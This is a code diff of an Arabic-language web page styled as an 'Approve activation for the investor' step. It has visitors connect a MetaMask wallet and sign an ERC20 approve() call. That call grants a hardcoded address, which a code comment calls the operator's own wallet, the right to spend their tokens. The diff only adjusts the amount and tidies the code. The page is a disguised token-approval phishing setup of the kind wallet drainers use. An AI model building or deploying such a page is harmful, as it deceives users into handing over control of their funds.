@@ -3,16 +3,16 @@
 <head>
   <meta charset="UTF-8" />
   <title>تفعيل Approve للمستثمر</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js"></script>
 </head>
 <body>
   <h2>أدخل عنوان التوكن ERC20</h2>
   <input type="text" id="tokenAddress" placeholder="مثال: 0xdAC17F958D2ee523a2206206994597C13D831ec7" style="width: 400px;" />
   <br /><br />
-  <button id="approveBtn">اعمل Approve 1000000</button>
+  <button id="approveBtn">اعمل Approve 1000</button>
 
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
   <script>
-    const spenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D"; // عنوان محفظتك اللي هتاخد الصلاحية
+    const spenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D"; // محفظتك
 
     const erc20Abi = [
       "function approve(address spender, uint256 amount) public returns (bool)",
@@ -22,30 +22,30 @@
     async function approve() {
       try {
         if (!window.ethereum) {
-          alert("يرجى تثبيت MetaMask أو محفظة تدعم Ethereum.");
+          alert("يرجى تثبيت MetaMask.");
           return;
         }
 
         await window.ethereum.request({ method: 'eth_requestAccounts' });
+
         const provider = new ethers.BrowserProvider(window.ethereum);
         const signer = await provider.getSigner();
 
         const tokenAddress = document.getElementById("tokenAddress").value.trim();
         if (!ethers.isAddress(tokenAddress)) {
-          alert("عنوان التوكن غير صحيح!");
+          alert("عنوان التوكن غير صالح!");
           return;
         }
 
         const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, signer);
-
-        // جلب عدد الديسيمالز عشان نحول 1000 للـ wei الصحيح
         const decimals = await tokenContract.decimals();
-        const amountToApprove = ethers.parseUnits("1000", decimals);
 
-        const tx = await tokenContract.approve(spenderAddress, amountToApprove);
-        alert("تم إرسال طلب الموافقة، رقم العملية: " + tx.hash);
+        const amount = ethers.parseUnits("1000", decimals);
 
-        await tx.wait(); // انتظار تأكيد العملية
+        const tx = await tokenContract.approve(spenderAddress, amount);
+        alert("تم إرسال العملية. Hash: " + tx.hash);
+
+        await tx.wait();
         alert("تمت الموافقة بنجاح!");
       } catch (error) {
         console.error(error);
@@ -53,7 +53,7 @@
       }
     }
 
-    document.getElementById("approveBtn").onclick = approve;
+    document.getElementById("approveBtn").addEventListener("click", approve);
   </script>
 </body>
 </html>
